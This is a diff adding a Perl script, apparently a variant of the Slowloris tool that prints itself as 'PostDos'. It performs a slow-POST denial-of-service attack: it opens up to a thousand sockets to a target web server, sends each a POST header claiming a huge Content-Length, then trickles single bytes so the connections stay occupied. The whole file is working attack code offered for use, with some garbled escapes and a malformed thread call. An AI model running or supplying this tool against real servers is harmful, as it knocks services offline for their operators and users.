@@ -1,0 +1,221 @@
+#!/usr/bin/perl -w
+use strict;
+use IO::Socket::INET;
+use IO::Socket::SSL;
+use Getopt::Long;
+use Config;
+
+$SIG{'PIPE'} = 'IGNORE'; #Ignore broken pipe errors
+
+my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
+my ( $cache, $ssl, $rand, $tcpto );
+my $result = GetOptions(
+    'shost=s' => $shost,
+    'dns=s' => $host,
+    'num=i' => $connections,
+    'cache' => $cache,
+    'port=i' => $port,
+    'https' => $ssl,
+    'tcpto=i' => $tcpto,
+    'test' => $test,
+    'timeout=i' => $timeout,
+    'version' => $version,
+);
+
+if ($version) {
+    print "Version 0.7n";
+    exit;
+}
+
+unless ($host) {
+    print "Usage:nntperl $0 -dns [www.example.com] -optionsn";
+    print "ntType 'perldoc $0' for help with options.nn";
+    exit;
+}
+
+unless ($port) {
+    $port = 80;
+    print "Defaulting to port 80.n";
+}
+
+unless ($tcpto) {
+    $tcpto = 5;
+    print "Defaulting to a 5 second tcp connection timeout.n";
+}
+
+unless ($test) {
+    unless ($timeout) {
+        $timeout = 100;
+        print "Defaulting to a 100 second re-try timeout.n";
+    }
+    unless ($connections) {
+        $connections = 1000;
+        print "Defaulting to 1000 connections.n";
+    }
+}
+
+my $usemultithreading = 0;
+if ( $Config{usethreads} ) {
+    print "Multithreading enabled.n";
+    $usemultithreading = 1;
+    use threads;
+    use threads::shared;
+} else {
+    print "No multithreading capabilites found!n";
+    print "Slowloris will be slower than normal as a result.n";
+}
+
+my $packetcount : shared = 0;
+my $failed : shared = 0;
+my $connectioncount : shared = 0;
+
+srand() if ($cache);
+
+if ($shost) {
+    $sendhost = $shost;
+} else {
+    $sendhost = $host;
+}
+
+print "Connecting to $host:$port every $timeout seconds with $connections sockets:n";
+
+if ($usemultithreading) {
+    domultithreading($connections);
+} else {
+    doconnections( $connections, $usemultithreading );
+}
+
+
+sub doconnections {
+    my ( $num, $usemultithreading ) = @_;
+    my ( @first, @sock, @working );
+    my $failedconnections = 0;
+    $working[$_] = 0 foreach ( 1 .. $num ); #initializing
+    $first[$_] = 0 foreach ( 1 .. $num ); #initializing
+    while (1) {
+        $failedconnections = 0;
+        print "ttBuilding sockets.n";
+        foreach my $z ( 1 .. $num ) {
+            if ( $working[$z] == 0 ) {
+                if ($ssl) {
+                    if (
+                        $sock[$z] = new IO::Socket::SSL(
+                            PeerAddr => "$host",
+                            PeerPort => "$port",
+                            Timeout => "$tcpto",
+                            Proto => "tcp",
+                        )
+                      )
+                    {
+                        $working[$z] = 1;
+                    }
+                    else {
+                        $working[$z] = 0;
+                    }
+                }
+                else {
+                    if (
+                        $sock[$z] = new IO::Socket::INET(
+                            PeerAddr => "$host",
+                            PeerPort => "$port",
+                            Timeout => "$tcpto",
+                            Proto => "tcp",
+                        )
+                      )
+                    {
+                        $working[$z] = 1;
+                        $packetcount = $packetcount + 3; #SYN, SYN+ACK, ACK
+                    }
+                    else {
+                        $working[$z] = 0;
+                    }
+                }
+                if ( $working[$z] == 1 ) {
+                    if ($cache) {
+                        $rand = "?" . int( rand(99999999999999) );
+                    } else {
+                        $rand = "";
+                    }
+                    my $primarypayload =
+                        "POST /$rand HTTP/1.1\r\n"
+                      . "Host: $sendhost\r\n"
+                     . "Connection: keep-alive\r\n"
+                     . "Keep-Alive: 900\r\n"
+                     . "Content-Length: 100000000\r\n"
+                     . "Content-Type: application/x-www-form-urlencoded\r\n"
+                     . "Accept: *.*\r\n"
+                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n\r\n";
+                    my $handle = $sock[$z];
+                    if ($handle) {
+                        print $handle "$primarypayload";
+                        if ( $SIG{__WARN__} ) {
+                            $working[$z] = 0;
+                            close $handle;
+                            $failed++;
+                            $failedconnections++;
+                        }
+                        else {
+                            $packetcount++;
+                            $working[$z] = 1;
+                        }
+                    }
+                    else {
+                        $working[$z] = 0;
+                        $failed++;
+                        $failedconnections++;
+                    }
+                }
+                else {
+                    $working[$z] = 0;
+                    $failed++;
+                    $failedconnections++;
+                }
+            }
+        }
+        print "ttSending data.\n";
+        foreach my $z ( 1 .. $num ) {
+            if ( $working[$z] == 1 ) {
+                if ( $sock[$z] ) {
+                    my $handle = $sock[$z];
+                    if ( print $handle "z" ) {
+                        $working[$z] = 1;
+                        $packetcount++;
+                    }
+                    else {
+                        $working[$z] = 0;
+                        #debugging info
+                        $failed++;
+                        $failedconnections++;
+                    }
+                }
+                else {
+                    $working[$z] = 0;
+                    #debugging info
+                    $failed++;
+                    $failedconnections++;
+                }
+            }
+        }
+        print "Current stats:tPostDos has now sent $packetcount packets successfully.\n
+                This thread now sleeping for $timeout seconds...\n\n";
+        sleep($timeout);
+    }
+}
+
+sub domultithreading {
+    my ($num) = @_;
+    my @thrs;
+    my $i = 0;
+    my $connectionsperthread = 50;
+    while ( $i < $num ) {
+        $thrs[$i] =
+          threads->create( &doconnections, $connectionsperthread, 1 );
+        $i += $connectionsperthread;
+    }
+    my @threadslist = threads->list();
+    while ( $#threadslist > 0 ) {
+        $failed = 0;
+    }
+}
+
+__END__
